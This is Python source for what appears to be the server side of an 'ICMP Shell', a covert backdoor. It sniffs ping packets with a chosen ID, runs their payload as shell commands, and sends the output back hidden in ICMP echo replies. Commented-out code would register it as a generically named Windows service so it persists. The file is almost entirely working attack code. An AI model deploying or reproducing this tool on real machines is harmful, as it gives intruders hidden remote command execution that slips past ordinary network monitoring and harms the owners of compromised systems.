import argparse
import platform
import subprocess
import sys
import threading

from scapy.layers.inet import IP, ICMP
from scapy.layers.l2 import Ether
from scapy.sendrecv import sniff, send

import config
import opening_terminal

output = None
error = None
destination_ip = ""
source_ip = ""
destination_mac = "ff:ff:ff:ff:ff:ff"
source_mac = "ff:ff:ff:ff:ff:ff"


def send_packet():
    global destination_ip, destination_mac, source_mac, source_mac
    for l in iter(opening_terminal.p.stdout.readline, b""):
        string = f'{l.decode("cp866", "backslashreplace")}'.strip()
        if string == '':
            continue
        reply_packet = IP(dst=destination_ip) / ICMP(type=0,
                                                     id=config.ID) / string
        send(reply_packet, verbose=False)
        sys.stdout.write(string + "\n")


def readstdout():
    send_packet()


def readstderr():
    send_packet()


def sendcommand(cmd):
    opening_terminal.p.stdin.write(cmd.encode() + b"\n")
    opening_terminal.p.stdin.flush()


def packet_callback(packet):
    global destination_ip, destination_mac, source_ip, source_mac
    if ICMP in packet and packet[ICMP].ID == config.ID and packet[ICMP].type == 8:
        destination_ip = packet[IP].src
        source_ip = packet[IP].dst
        destination_mac = packet[Ether].src
        source_mac = packet[Ether].dst
        received_data = packet[ICMP].payload.load.decode('utf-8')
        print("-----+ OUT DATA +-----")
        sendcommand(received_data)


def main():
    ish_debug = 1

    parser = argparse.ArgumentParser(description='ICMP Shell')

    parser.add_argument('-i', help='Назначение идентификатора процесса (диапазон: 0-65535; по-умолчанию 1515)')
    parser.add_argument('-d', help='Запуск сервера в режиме debug', action='store_true')

    args = parser.parse_args()

    if args.i:
        config.ID = args.i
    if args.d:
        ish_debug = 0
    t1 = threading.Thread(target=readstdout)
    t2 = threading.Thread(target=readstderr)

    t1.start()
    t2.start()

    if (ish_debug):
        sniff(filter="icmp", prn=packet_callback)


# sniff(filter="icmp", prn=packet_callback)


# class TestService(win32serviceutil.ServiceFramework):
#    _svc_name_ = 'TestService'
#    _svc_display_name_ = 'TestService'
#
#    def __init__(self, args):
#        win32serviceutil.ServiceFramework.__init__(self, args)
#        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
#        socket.setdefaulttimeout(60)
#
#    def SvcStop(self):
#        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
#        win32event.SetEvent(self.hWaitStop)
#
#    def SvcDoRun(self):
#        servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE, servicemanager.PYS_SERVICE_STARTED,
#                              (self._svc_name_, ''))
#        self.main()
#
#    def main(self):
#        f = open('D:\\test.txt', 'a')
#        rc = None
#        while rc != win32event.WAIT_OBJECT_0:
#            f.write('Test Service  \n')
#            f.flush()
#            # block for 24*60*60 seconds and wait for a stop event
#            # it is used for a one-day loop
#            rc = win32event.WaitForSingleObject(self.hWaitStop, 24 * 60 * 60 * 1000)
#        f.write('shut down \n')
#        f.close()

# class Service(win32serviceutil.ServiceFramework):
#    _svc_name_ = "Service"
#    _svc_display_name_ = "Service"
#
#    def __init__(self, args):
#        win32serviceutil.ServiceFramework.__init__(self, *args)
#        self.log('Service Initialized.')
#        self.stop_event = win32event.CreateEvent(None, 0, 0, None)
#
#    def log(self, msg):
#        servicemanager.LogInfoMsg(str(msg))
#
#    def SvcStop(self):
#        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
#        self.log('Service has stopped.')
#        win32event.SetEvent(self.stop_event)
#        self.ReportServiceStatus(win32service.SERVICE_STOPPED)
#
#    def SvcDoRun(self):
#        self.ReportServiceStatus(win32service.SERVICE_START_PENDING)
#        try:
#            self.ReportServiceStatus(win32service.SERVICE_RUNNING)
#            self.log('Service is starting.')
#            self.main()
#            win32event.WaitForSingleObject(self.stop_event, win32event.INFINITE)
#            servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE, servicemanager.PYS_SERVICE_STARTED,
#                                  (self._svc_name_, ''))
#        except Exception as e:
#            s = str(e)
#            self.log('Exception :' + s)
#
#    def main(self):
#        t1 = threading.Thread(target=readstdout)
#        t2 = threading.Thread(target=readstderr)
#
#        t1.start()
#        t2.start()
#        sniff(filter="icmp", prn=packet_callback)


if __name__ == '__main__':
    main()
    # if len(sys.argv) == 1:
    #    servicemanager.Initialize()
    #    servicemanager.PrepareToHostSingle(Service)
    #    servicemanager.StartServiceCtrlDispatcher()
    # else:
    #    win32serviceutil.HandleCommandLine(Service)
